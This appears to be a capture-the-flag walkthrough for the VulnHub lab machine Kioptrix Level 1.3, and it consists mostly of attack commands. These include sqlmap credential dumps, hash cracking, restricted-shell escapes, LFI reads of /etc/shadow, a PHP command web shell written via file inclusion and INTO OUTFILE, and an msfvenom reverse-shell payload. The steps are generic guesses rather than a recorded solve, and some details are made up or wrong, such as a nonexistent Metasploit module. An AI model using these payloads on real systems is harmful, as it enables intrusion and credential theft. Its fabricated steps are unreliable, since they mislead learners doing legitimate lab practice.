# Kioptrix Level 1.3 (#4): OSCP Walkthrough

> **Machine:** Kioptrix Level 1.3 (#4)
> **Source:** VulnHub (Kioptrix series)
> **IP Address:** 192.168.x.x (DHCP)
> **OS:** Linux
> **Difficulty:** Easy / Beginner
> **Focus:** Web exploitation, SQL injection, shell escape, privilege escalation
> **Original Blog:** [kioptrix.com/blog/?p=604](http://www.kioptrix.com/blog/?p=604)

---

## Recon

> **Note:** The NIC may not come up immediately on boot: be patient and wait for DHCP.

```bash
# Discover target IP
sudo netdiscover -i eth0

# Initial targeted scan
nmap -sV -sC -p 22,80,443 192.168.x.x

# Full port scan
nmap -sV -sC -p- 192.168.x.x

# OS detection
nmap -sV -sC -O -p 22,80 192.168.x.x
```

**Expected results:**
- Port 22: SSH (OpenSSH)
- Port 80: HTTP (Apache + PHP/MySQL: likely a vulnerable web application)
- The web application may have SQL injection points and restricted shells

---

## Enumeration

### Web Enumeration

```bash
# Nikto web server scan
nikto -h http://192.168.x.x

# Gobuster directory enumeration
gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old

# Whatweb fingerprinting
whatweb http://192.168.x.x

# Check for common vulnerable paths
curl http://192.168.x.x/
curl http://192.168.x.x/admin/
curl http://192.168.x.x/login/
curl http://192.168.x.x/wp-admin/
curl http://192.168.x.x/.phpmyadmin/
curl http://192.168.x.x/info.php

# Search for PHP info or version disclosure
curl http://192.168.x.x/readme.html
curl http://192.168.x.x/license.txt
```

### SQL Injection Reconnaissance

```bash
# Test for SQL injection in URL parameters
curl "http://192.168.x.x/index.php?id=1"
curl "http://192.168.x.x/index.php?id=1'"
curl "http://192.168.x.x/index.php?id=1\""

# Use sqlmap for automated detection
sqlmap -u "http://192.168.x.x/index.php?id=1" --batch --dbs --dump

# Check MySQL version and data
sqlmap -u "http://192.168.x.x/index.php?id=1" --batch --dbms=mysql --dump-all
```

> **Screenshots:** See Key Takeaways section

---

## Exploitation

### SQL Injection to Get Shell

```bash
# Dump all databases to understand the application structure
sqlmap -u "http://192.168.x.x/index.php?id=1" --batch --dbs

# Identify the database used by the web application
# Likely named something like "mysql", "wordpress", or a custom name

# Dump all tables in the identified database
sqlmap -u "http://192.168.x.x/index.php?id=1" --batch -D <database_name> --tables

# Dump all data from the user/credentials table
sqlmap -u "http://192.168.x.x/index.php?id=1" --batch -D <database_name> -T users --dump

# Extract password hashes and crack them
# MySQL root password hash may be exposed
# Crack with john:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Bypassing Restricted Shell / Limited Shell

> Kioptrix machines often have a limited or restricted shell environment.

```bash
# If you get a restricted shell, try these escape techniques:

# Method 1: Use Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import os; os.system("/bin/bash")'

# Method 2: Use expect
expect -c 'spawn /bin/bash'

# Method 3: Use ed editor
ed
!/bin/bash

# Method 4: Use awk
awk 'BEGIN {system("/bin/bash")}'

# Method 5: Use vi
vi
:!/bin/bash

# Method 6: Use nmap with interactive mode
nmap --interactive

# Method 7: Use less/more
less
!/bin/bash

# Method 8: Use script command
script /dev/null
/bin/bash
```

### File Inclusion Exploitation

```bash
# If local file inclusion (LFI) is found:
# Use lfi to read sensitive files
curl "http://192.168.x.x/index.php?page=../../etc/passwd"
curl "http://192.168.x.x/index.php?file=../../etc/shadow"
curl "http://192.168.x.x/index.php?page=php://filter/convert.base64-encode/resource=config.php"

# Use LFI to include a PHP shell
# If /tmp is writable and included:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl "http://192.168.x.x/index.php?page=/tmp/shell.php&cmd=id"
```

### MySQL Exploitation

```bash
# If MySQL root access is available (no password or cracked password)
mysql -u root -p

# Read files from the filesystem
LOAD_FILE('/etc/passwd')
LOAD_FILE('/etc/shadow')

# Write to the filesystem (if secured_file_priv is empty or null)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

# Execute system commands via MySQL UDF or into outfile
```

### Get Reverse Shell

```bash
# Upload a PHP webshell via SQL injection outfile
# Or use Metasploit
msfconsole -q
use exploit/multi/webapp/sqlmap_auth bypass
set RHOSTS 192.168.x.x
set TARGETURI /
exploit

# Manual PHP reverse shell
# After getting the shell, upload msfvenom payload:
# msfvenom -p php/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw > shell.php
```

## Privesc

### After Getting Initial Shell

```bash
# Check current user
id
whoami
uname -a

# Check sudo privileges
sudo -l

# Look for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for world-writable SUID binaries
find / -perm -4000 -writable -type f 2>/dev/null

# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# Check for password files or config files readable by user
cat /etc/passwd
cat /etc/shadow
find / -readable -name "*.conf" 2>/dev/null | grep -v proc
```

### Common Kioptrix Privesc Escalation

```bash
# Often the Kioptrix machines have kernel exploits available
# Check kernel version
uname -r

# Search for local privilege escalation exploits
# Based on kernel version, use an appropriate exploit
searchsploit <kernel_version>

# Or check for known vulnerable binaries
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# If you found writable sudoers scripts or commands
# Use GTFOBins for the specific command that sudo allows
```

### Read Root Flag

```bash
# After root access obtained
cat /root/root.txt
```

> **Screenshots:** See Key Takeaways section

---

## Key Takeaways

1. **SQL injection remains a foundational skill** for the OSCP: Kioptrix is an excellent intro to SQLi exploitation.
2. **Shell escape techniques are critical**: restricted/limited shells are common on beginner machines; know at least 8+ methods.
3. **MySQL `LOAD_FILE()` and `INTO OUTFILE`** are powerful SQLi post-exploitation tools for reading/writing files.
4. **sqlmap automates the heavy lifting**, but understand the underlying queries and payloads it generates.
5. **The `--batch` flag** in sqlmap runs non-interactively: great for automated enumeration.
6. **Kioptrix is a learning machine**: focus on understanding each technique rather than speed.
7. **Kernel exploits are a common privesc path** on older Linux kernel versions: always check `uname -r` and reference searchsploit.

---

*M4d3 w1th ❤️ by Ankit Patidar*
